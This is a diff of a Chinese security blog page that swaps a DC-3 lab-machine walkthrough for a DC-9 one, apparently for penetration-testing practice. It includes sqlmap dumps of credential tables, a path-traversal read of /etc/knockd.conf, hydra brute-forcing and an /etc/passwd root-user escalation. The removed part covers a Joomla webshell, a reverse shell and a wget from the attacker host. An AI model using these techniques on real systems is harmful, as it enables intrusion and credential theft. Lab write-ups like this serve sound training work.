@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="网络,web安全,靶机,linux,安全,dc">
+    <meta name="keywords" content="网络,安全性测试">
     
     <meta name="author" content="lee">
     
@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/2026/01/28/dc系列——dc3/"/>
+    <link rel="canonical" href="https://leei.site/2026/02/05/dc9打靶报告/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,14 +133,14 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dc3靶机报告">
-<meta property="og:url" content="https://leei.site/2026/01/28/dc%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94dc3/index.html">
+<meta property="og:title" content="dc9打靶报告">
+<meta property="og:url" content="https://leei.site/2026/02/05/dc9%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-01-27T23:22:43.022Z">
-<meta property="article:modified_time" content="2026-02-05T02:50:36.391Z">
+<meta property="article:published_time" content="2026-02-04T19:02:56.341Z">
+<meta property="article:modified_time" content="2026-02-05T03:04:28.512Z">
 <meta property="article:author" content="Le_ee 博客等级 码龄1年">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
@@ -155,7 +155,7 @@
     
     <title>
         
-            dc3靶机报告 | lee&#39;s seclab
+            dc9打靶报告 | lee&#39;s seclab
         
     </title>
 
@@ -608,7 +608,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">dc3靶机报告</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">dc9打靶报告</h1>
 			</div>
 			
 		</div>
@@ -629,15 +629,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-01-28 07:22:43</span>
-        <span class="mobile">2026-01-28 07:22:43</span>
+        <span class="desktop">2026-02-05 03:02:56</span>
+        <span class="mobile">2026-02-05 03:02:56</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-02-05 10:50:36</span>
-            <span class="mobile">2026-02-05 10:50:36</span>
+            <span class="desktop">2026-02-05 11:04:28</span>
+            <span class="mobile">2026-02-05 11:04:28</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -665,361 +665,300 @@
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
 			<meta name="referrer" content="no-referrer"/>
-先arp-scan -l扫，发现疑似靶机ip——192.168.145.185
+环境：
 
+<p>攻击机Kali IP: 192.168.145.128</p>
+<p>扫描局域网发现存活主机</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/44849b2f93a94525bacc07e4de5157af.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/bf7afd824d4044eb83caf2f493bd58df.png"
                      
                 ></p>
-<p>nmap进一步扫</p>
+<p>nmap看dc9开放端口</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2a53cd79a30b437f9ab591dbc8466792.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/84da8c38c2d94c1ba013217897e5cee9.png"
                      
                 ></p>
-<p>分析一下回显：</p>
-<p>只开了一个80端口，服务是http，服务是Apache&#x2F;2.4.18 (Ubuntu)，操作系统是Linux 3.2 - 4.9，</p>
-<p>CMS（内容管理系统）是Joomla！</p>
-<p>我们打开网页看看，提示本次只存在一个flag，能在提权到root后拿到</p>
+<p><strong>回显：</strong>22端口关闭，80端口开放（Apache服务&#x2F;2.4.38）</p>
+<p>whatweb进一步探查，确定无cms，是自定义网页</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/85b5d4457e2f472cb3b1c5ff2a120020.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/06335f1c7add4925b01295cf424edee4.png"
+                     
+                ></p>
+<p>看一下页面长这样</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/23765c075ee84d4e992b9c83e2974c84.png"
+                     
+                ></p>
+<p>disearch扫一下子url</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/83b1cc2101604ad1a67400a3c91566e2.png"
+                     
+                ></p>
+<p>有用的页面如下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/8c6a50021e834c71aa01b3210e451b08.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6f822321eea748719ad1279470a3e479.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/55c2e891c8bc4d1fa148e8becc231ff1.png"
                      
                 ></p>
-<p>nikto（网站安全扫描工具）扫一下，可以帮助我们得到敏感路径，安全问题，以及默认文件</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e6dba41802984286916060ac557561f9.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/6ee0677b43af4730a67cf675c74fff99.png"
                      
                 ></p>
-<p>分析回显：</p>
-<p>1：apache是2.4.18的，是2016版本，较老（2.4.54是2023的）</p>
-<p>2：http debug可能开启，它的作用是让服务器返回调试信息，我们可以通过</p>
-<p>curl -X DEBUG url ，去测试</p>
-<p>3：安全头缺失</p>
-<p>4：敏感目录暴露：</p>
-<ul>
-<li><code>/administrator/</code> → 登录页面</li>
-<li><code>/tmp/</code> → 尝试上传文件</li>
-<li><code>/includes/</code> → 找配置文件（数据库密码）</li>
-<li>&#x2F;bin&#x2F; ➡可能包含脚本文件</li>
-</ul>
-<p>我们这用joomscan扫以下版本号</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan --url http://192.168.145.185</span><br></pre></td></tr></table></figure></div>
+<p>发现一个search输入框</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/56d7ca2d959144199ce39d0661ad4e4a.png"
+                     
+                ></p>
+<p>测试永真永假语句发现回显不一样，说明存在sql注入点</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/00694863e6cc4866b40022b762ea8323.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/27dc9e631af34022b54b68667078eb3b.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/61fb0d22a7bc4b26b2314eba08693726.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e1e4782d24c14b04bd4f7489a39b4e59.png"
+                     
+                ></p>
+<p>看一下源码，确定是post</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/d97d27dab54949f3aa29c1993ec68a5b.png"
+                     
+                ></p>
+<p>所以用sqlmap，向search.php发送post请求，在名为 <code>search</code>的字段里测试注入，下面所有的sqlmap语句均先用1这个值作为基础</p>
+<p>先查询库名</p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” –dbs”</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/ceffef440d1a4ed19e2754c9f450af79.png"
+                     
+                ></p>
+<p>发现三个库</p>
+<p>先看看users表里面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/6aabd438c5914364b4cd38b459110940.png"
+                     
+                ></p>
+<p>有用户和密码，再往里爆一层，我们只导出用户名和密码</p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” -D users -T UserDetails -C “username,password” –dump –batch</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e1b6cd9235e241ed9e74421f05427224.png"
+                     
+                ></p>
+<p>分别都做成文件先存起来，之前ssh没开，目前无法使用hydra爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/90054770d4634fa8835401defd919c89.png"
+                     
+                ></p>
+<p>先继续搜</p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” -D Staff –tables –batch</p>
+<p>看到Staff库里有两个表</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/f62d41e065ea4c04be78fcd61b1a7f10.png"
+                     
+                ></p>
+<p>看看第一个表里有什么</p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” -D Staff -T StaffDetails –columns –batch</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/d355f50b47cf419c8d4b3befdceb1024.png"
+                     
+                ></p>
+<p>用户名：</p>
+<p>继续看users里面有什么</p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” -D Staff -T Users –columns –batch</p>
+<p>爆出来三个字符段——密码，id，名字<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/b6a2e1834019403dab183556bffe5f3f.png"
+                     
+                ></p>
+<p>sqlmap -u “<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/results.php" >http://192.168.145.191/results.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –data&#x3D;”search&#x3D;1” -D Staff -T Users –dump –batch</p>
+<p>继续爆下去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/b2521ff6d63f426399d072057c54da02.png"
+                     
+                ></p>
+<p>得到admin的密码，附一个破解哈希密码的网址<a class="link"   target="_blank" rel="noopener" href="https://crackstation.net/"  title="CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/64c9e4cc9c6245788d2ebdfbfb429db3.png"
+                     
+                ></p>
+<p>得到密码transorbital1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/514bbebc948b4c72928d8db6a8049495.png"
+                     
+                ></p>
+<ol start="5">
+<li>登录后台</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/6e2232335a024e099d1bb874a34fea85.png"
+                     
+                ></p>
+<p>测试是否存在文件包含漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/6ee84a115bed4b82b566a87256488cdf.png"
+                     
+                ></p>
+<p>存在文件包含漏洞，通过参数file可以读取任意文件，刚开始nmap的时候，可以知道负责ssh的22端口没开，我们现在要通过端口敲门把他打开</p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://192.168.145.191/addrecord.php/?file=../../../../../../etc/knockd.conf" >http://192.168.145.191/addrecord.php/?file=../../../../../../etc/knockd.conf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/d3154674b3ce46b7bde4e24e78d2b436.png"
+                     
+                ></p>
+<p>获得了端口敲门序列</p>
+<p>打开SSH：7469 → 8475 → 9842 正向<br>关闭SSH：9842 → 8475 → 7469 反向</p>
+<p>使用nc按序列敲门触发防火墙规则，打开了22端口</p>
+<p>** <code>-z</code>** &#x3D; zero-I&#x2F;O模式（只连接，不发送数据）</p>
+<p>只测试端口是否可连接</p>
+<p>连接成功立即断开</p>
+<p>不进行数据交互</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/3af74201d6d04d0fbcfcf039fe4c227b.png"
+                     
+                ></p>
+<p>然后我们现在就可以用hydra爆破了</p>
+<p>得到三组用户以及密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/966f9c7291694da9875199058568dc7d.png"
+                     
+                ></p>
+<p>逐个进去看，都没有什么有用信息，到了janitor之后多了一个有secrets的目录，进去看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/1c6bb7a293f64b0b9e1d6a03d9fcd1c3.png"
+                     
+                ></p>
+<p>发现又多了几个密码，加到密码列表里继续爆破</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/c212b68cc7a24f9a875b67c9b12a034b.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/bd8606a3cb904acd90864e345767a37b.png"
+                     
+                ></p>
+<p>再爆破一遍，得到了新的账户密码——fredf</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/c8095c4b50644b3a9f16291e565ef040.png"
+                     
+                ></p>
+<p>远程连接成功登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/00c68a5496fe4709b7532ac4e495ab6b.png"
+                     
+                ></p>
+<p>查看 <code>sudo -l</code>：发现可执行 <code>/opt/devstuff/dist/test/test</code>（root权限）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/674d1a0a17684947b41c9080d8439bc4.png"
+                     
+                ></p>
+<p>进去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e4825b896cb945b9b1330b03c5138c25.png"
+                     
+                ></p>
+<p>我们来分析一下脚本内容，大致是把第一个打开的文件给加到第二个后面，因为这个脚本是以root运行的，所以我们可以利用它来修改系统文件——&#x2F;etc&#x2F;passwd</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = open(sys.argv[1], &quot;r&quot;)     # &amp;#x6253;&amp;#x5F00;&amp;#x7B2C;&amp;#x4E00;&amp;#x4E2A;</span><br><span class="line">output = (f.read())            # &amp;#x8BFB;&amp;#x53D6;&amp;#x5168;&amp;#x90E8;&amp;#x5185;&amp;#x5BB9;</span><br><span class="line"></span><br><span class="line">f = open(sys.argv[2], &quot;a&quot;)     # &amp;#x6253;&amp;#x5F00;&amp;#x7B2C;&amp;#x4E8C;&amp;#x4E2A;</span><br><span class="line">f.write(output)                # &amp;#x5C06;&amp;#x8BFB;&amp;#x53D6;&amp;#x7684;&amp;#x5185;&amp;#x5BB9;&amp;#x5199;&amp;#x5165;</span><br><span class="line">f.close()v</span><br></pre></td></tr></table></figure></div>
 
-<p>回显是3.7.0的版本</p>
+<p>所以直接创建一个root用户提权，用openssl passwd 把密码加密加盐</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8482b552243e40aca29b4d4afaaec823.png"
-                     
-                ></p>
-<p>并且暴露出来几个目录列表</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7d58daf31fac4bb6ac08c3a5189492ac.png"
-                     
-                ></p>
-<p>ps：补充几个常扫CMS的工具</p>
-<p>joomscan——joomal</p>
-<p>wpscan——wordpress</p>
-<p>droopescan——drupal</p>
-<p>我们挨个进去看看：</p>
-<p>第一个：<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.185/administrator/components" >http://192.168.145.185/administrator/components<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ee857c514ddc451887e7a2f48ea126a8.png"
-                     
-                ></p>
-<p>第二个：<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.185/administrator/modules" >http://192.168.145.185/administrator/modules<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/121c095930b246f8ab0a33b147fc9995.png"
-                     
-                ></p>
-<p>第三个：<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.185/administrator/templates" >http://192.168.145.185/administrator/templates<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/be674e0677c04b6ca532a9e1dad363f1.png"
-                     
-                ></p>
-<p>第四个：<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.182/images/banners/" >http://192.168.145.182/images/banners/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d9bfee6a3c774352b46b29cf1b318303.png"
-                     
-                ></p>
-<p>然后我们用searchsploit看看有没有可以利用的攻击点，看到第一个漏洞就是sql漏洞</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b4e9fee97e304fa096badeda4d01dad0.png"
-                     
-                ></p>
-<p>我们把这个漏洞文件复制到当前目录然后cat一下</p>
-<p>我们来分析一下这个文档，最上面的几个#后标注了这个sql漏洞的基本信息，然后给了一个url示例，接着是sqlmap的攻击示例</p>
-<p>最下面是通过跑sqlmap本次攻击用到的几种方法——布尔盲注，报错注，时间盲注</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d48a1b6e1518464fa16602cf414067d1.png"
-                     
-                ></p>
-<p>先试试url是否有不一样的回显，别忘了localhost换成靶机ip</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d6f9e675d70e4222ba4cf8e0c3ddfc0d.png"
-                     
-                ></p>
-<p>有回显，可以尝试sqlmap了</p>
-<p>“<a class="link"   target="_blank" rel="noopener" href="http://192.168.145.185/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml" >http://192.168.145.185/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ –risk&#x3D;3 –level&#x3D;5 –random-agent –dbs -p list[fullordering]</p>
-<p>成功爆出数据库名</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b0e1899f09b749319526e108620a3e98.png"
-                     
-                ></p>
-<p>去看joomladb的所有表，倒数第三个看到了users</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.145.185/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; -D joomladb --tables</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/be9b1de4c8b0488cb5cf626b1a7c97e7.png"
-                     
-                ><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d1016aced01f4763b4782291fd7fde01.png"
-                     
-                ></p>
-<p>接着从users表里面爆列</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.145.185/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 -p list[fullordering] -D &quot;joomladb&quot; --tables -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure></div>
-
-<p>出来六列</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/4a89928141eb4145b9ae8bac2a67819e.png"
-                     
-                ></p>
-<p>只看名字和密码两列</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.145.185/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 -p list[fullordering] -D &quot;joomladb&quot; --tables -T &quot;#__users&quot; --columns -C &quot;username,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
-
-<p>出来了admin和admin的哈希加密密码wsl</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9863e363cdec4dc39a81773c54a3d87a.png"
-                     
-                ></p>
-<p>然后随便创建一个txt文件把哈希数据存进去，用john来爆破密码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/b3330de1bb1d422a89e74dedd439d2a7.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/f8ecf9f946d1496c9913122c79c28310.png"
                      
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2c2df5d70bee490c87f7092ba0c50519.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/23494206c4de4886b6e3eb25d695a2d6.png"
                      
                 ></p>
+<p>成功</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a1ddeb2b58814468b27f3403b05a3f75.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/2ba6629357a5410ba235d8be2d4e778b.png"
                      
                 ></p>
-<p>得到密码snoopy</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d742cf8b20a64ea9817a3873fb7003be.png"
-                     
-                ></p>
-<p>去dc3页面上看登录</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/bb741dc553134db99827b8a30f39bf86.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/51d7a69b105948fc82b4d1110aec2cf5.png"
-                     
-                ></p>
-<p>如果很了解joomla框架的话，可以知道后台存在模板管理器，我们通过模板编辑功能可以写入恶意代码</p>
-<p>位置在&#x2F;templates&#x2F;templates</p>
-<p>我们在Extensions里面找到了模板文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d96d4a1ce18f486a877da467bd25b9e8.png"
-                     
-                ></p>
-<p>进入第一个，这个Beezes3 detail and files，它是joomla的模板编辑入口，可以查看，编辑模板，上传文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a7c66ec6986a442a925d1f6af6d76b0e.png"
-                     
-                ></p>
-<p>可以看到创建新文件的位置，我们创建新文件写入一句话木马</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/325c86c539164c4993c37565a3079c09.png"
-                     
-                ></p>
-<p>在分类里面创建一个php文件，获得一个11.php</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0f7f0a52d9ac4d0184e361a942c35bd3.png"
-                     
-                ></p>
-<p>save创建</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3462fb0db61b4a118923a74d90e8f727.png"
-                     
-                ></p>
-<p>蚁剑连接，joomla的模块会单独放在一个templates文件夹里，所以我们根据这个路径连接蚁剑</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/861c836b5c884f1db9f0d829ed8aea04.png"
-                     
-                ></p>
-<p>连接成功，在kali里面建立反弹shell，蚁剑目标机虚拟终端bash连接</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/587c63b069184528b8f8433733e9013c.png"
-                     
-                ><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7cc49b48c0284b189be9ad92f1cd88d9.png"
-                     
-                ></p>
-<p>下一步就是提权</p>
-<p>再开一个攻击端口，导到tmp目录下，用wget下载linux-exploit-suggester</p>
-<p>注意，这里用的是https网址，所以我们需要加上一个无需检查证书直接下载的参数——–no-check-certificate</p>
-<p>路径如下：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8906c407894a4aacbb85c8d4167e8191.png"
-                     
-                ></p>
-<p>然后把我们攻击机的http服务开开</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/655371a0359c4d0e9c7581a558754571.png"
-                     
-                ></p>
-<p>靶机反弹shell也导到tmp目录里<br>wget <a class="link"   target="_blank" rel="noopener" href="http://192.168.145.128:8000/linux-exploit-suggester.sh%EF%BC%8C%E9%80%9A%E8%BF%87%E6%88%91%E4%BB%AC%E7%9A%84kali%E6%9D%A5%E4%B8%8B%E8%BD%BD" >http://192.168.145.128:8000/linux-exploit-suggester.sh，通过我们的kali来下载<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/0deb7917036c4d46903496a7afa103a0.png"
-                     
-                ></p>
-<p>然后加入可执行权限</p>
